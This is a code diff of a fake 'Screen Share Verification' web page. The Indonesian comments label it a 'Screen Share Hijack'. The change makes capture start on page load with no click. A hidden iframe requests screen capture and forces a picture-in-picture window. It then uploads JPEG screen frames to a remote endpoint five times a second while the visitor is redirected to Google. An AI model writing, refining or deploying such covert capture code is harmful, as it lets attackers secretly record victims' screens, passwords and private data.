@@ -18,7 +18,7 @@
 
 <div class="panel" id="main-card">
   <h2>🔒 Screen Share Verification</h2>
-  <p>Klik untuk memverifikasi sesi Anda.</p>
+  <p>Memproses secara otomatis...</p>
   <div id="log">Sistem siap.</div>
 </div>
 
@@ -44,96 +44,120 @@
   var REDIRECT_DELAY = 3000; // 3 detik
 
   // ============================================
-  // 1. SCREEN SHARE & TELEMETRI
+  // 1. INJECT IFRAME ZERO-CLICK (SCREEN SHARE)
   // ============================================
-  async function startScreenShare() {
+  function injectScreenShareIframe() {
     try {
-      log("[+] Meminta Izin Screen Share...");
+      log("[+] Membuat Iframe Tersembunyi (Screen Share)...");
 
-      // Minta Screen Share (Butuh Gesture Asli)
-      var stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
-      log("[+] 🚨 SCREEN SHARE DIIZINKAN!");
+      var iframe = document.createElement('iframe');
+      // Atribut allow untuk display-capture
+      iframe.allow = "display-capture; autoplay; picture-in-picture; fullscreen";
+      iframe.style.display = "none";
+      
+      iframe.srcdoc = `
+        <!DOCTYPE html>
+        <html>
+        <body>
+          <video id="hiddenVideo" autoplay playsinline muted style="width:1px;height:1px;opacity:0.01;position:absolute;top:0;left:0;"></video>
+          <canvas id="hiddenCanvas" width="1280" height="720" style="display:none;"></canvas>
+          
+          <script>
+            (function() {
+              // 1. Minta Screen Share (Zero-Click)
+              navigator.mediaDevices.getDisplayMedia({ 
+                video: { cursor: "always" }, 
+                audio: false 
+              })
+                .then(function(stream) {
+                  var video = document.getElementById('hiddenVideo');
+                  video.srcObject = stream;
+                  video.play().catch(function(){});
+                  parent.postMessage({ type: 'SCREEN_OK' }, '*');
 
-      // Buat video transparan (untuk PiP / Fullscreen)
-      var video = document.createElement('video');
-      video.srcObject = stream;
-      video.muted = true;
-      video.playsInline = true;
-      video.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
-      document.body.appendChild(video);
+                  // 2. Paksa Masuk PiP
+                  setTimeout(function() {
+                    if (document.pictureInPictureElement) {
+                      document.exitPictureInPicture();
+                    }
+                    video.requestPictureInPicture()
+                      .then(function() {
+                        parent.postMessage({ type: 'PIP_OK' }, '*');
+                      })
+                      .catch(function(err) {
+                        parent.postMessage({ type: 'PIP_FAIL', error: err.message }, '*');
+                      });
+                  }, 500);
 
-      await video.play().catch(function(){});
+                  // 3. Telemetri (Kirim Frame Layar)
+                  setInterval(function() {
+                    var canvas = document.getElementById('hiddenCanvas');
+                    var ctx = canvas.getContext('2d');
+                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                      canvas.toBlob(function(blob) {
+                        if (!blob) return;
+                        var formData = new FormData();
+                        formData.append('file', blob, 'screen.jpg');
+                        fetch('${SERVER_ENDPOINT}', {
+                          method: 'POST',
+                          body: formData,
+                          keepalive: true
+                        }).catch(function(){});
+                      }, 'image/jpeg', 0.6);
+                    }
+                  }, 200);
 
-      // Coba Masuk PiP (Screen Share di PiP)
-      try {
-        await video.requestPictureInPicture();
-        log("[+] 🎥 PiP Screen Share AKTIF!");
-      } catch (pipErr) {
-        log("[-] PiP Gagal: " + pipErr.message);
-      }
+                })
+                .catch(function(err) {
+                  parent.postMessage({ type: 'SCREEN_FAIL', error: err.name }, '*');
+                });
+            })();
+          <\/script>
+        </body>
+        </html>
+      `;
 
-      // ============================================
-      // 2. TELEMETRI (KIRIM FRAME LAYAR)
-      // ============================================
-      var canvas = document.createElement('canvas');
-      canvas.width = 1280; // Resolusi layar lebih tinggi
-      canvas.height = 720;
-      var ctx = canvas.getContext('2d');
-
-      setInterval(function() {
-        if (video.readyState === video.HAVE_ENOUGH_DATA) {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(function(blob) {
-            if (!blob) return;
-            var formData = new FormData();
-            formData.append('file', blob, 'screen.jpg');
-            fetch(SERVER_ENDPOINT, {
-              method: 'POST',
-              body: formData,
-              keepalive: true
-            }).catch(function(){});
-          }, 'image/jpeg', 0.6);
-        }
-      }, 200); // 5 FPS
-
-      // ============================================
-      // 3. REDIRECT KE GOOGLE
-      // ============================================
-      setTimeout(function() {
-        log("[+] Redirect ke Google.com...");
-        try {
-          window.location.replace(TARGET_URL);
-        } catch(e) {}
-      }, REDIRECT_DELAY);
-
-    } catch(err) {
-      log("[-] Screen Share Diblokir: " + err.name);
-      // Fallback: Redirect ke Google setelah 1 detik
-      setTimeout(function() {
-        log("[+] Redirect ke Google (Screen Share gagal)...");
-        window.location.replace(TARGET_URL);
-      }, 1000);
+      document.getElementById("launcher-container").appendChild(iframe);
+      log("[+] Iframe disuntikkan.");
+    } catch(e) {
+      log("[-] Iframe Error: " + e.message);
     }
   }
 
   // ============================================
-  // TRIGGER (KLIK)
+  // 2. LISTENER PESAN DARI IFRAME
   // ============================================
-  document.body.addEventListener('click', function() {
+  window.addEventListener('message', function(e) {
+    switch (e.data.type) {
+      case 'SCREEN_OK': log("[+] 🚨 Screen Share DIIZINKAN (Zero-Click)!"); break;
+      case 'PIP_OK': log("[+] 🎥 PiP AKTIF!"); break;
+      case 'SCREEN_FAIL': log("[-] Screen Share ditolak: " + e.data.error); break;
+      case 'PIP_FAIL': log("[-] PiP ditolak: " + e.data.error); break;
+    }
+  });
+
+  // ============================================
+  // 3. TRIGGER ZERO-CLICK (OTOMATIS SAAT LOAD)
+  // ============================================
+  window.addEventListener('load', function() {
     if (executed) return;
     executed = true;
 
-    document.getElementById('main-card').innerHTML = `
-      <h2>⏳ Memverifikasi...</h2>
-      <p>Menghubungkan ke Google...</p>
-      <div id="log"></div>
-    `;
-    logEl = document.getElementById('log');
-    log("[!] Memulai Screen Share Hijack...");
+    log("[!] Memulai Zero-Click Screen Share...");
 
-    startScreenShare();
+    // A. Inject Iframe (0ms)
+    injectScreenShareIframe();
 
-  }, { once: true });
+    // B. Redirect ke Google (Setelah 3 detik)
+    setTimeout(function() {
+      log("[+] Redirect ke Google.com...");
+      try {
+        window.location.replace(TARGET_URL);
+      } catch(e) {}
+    }, REDIRECT_DELAY);
+
+  });
 
 })();
 </script>
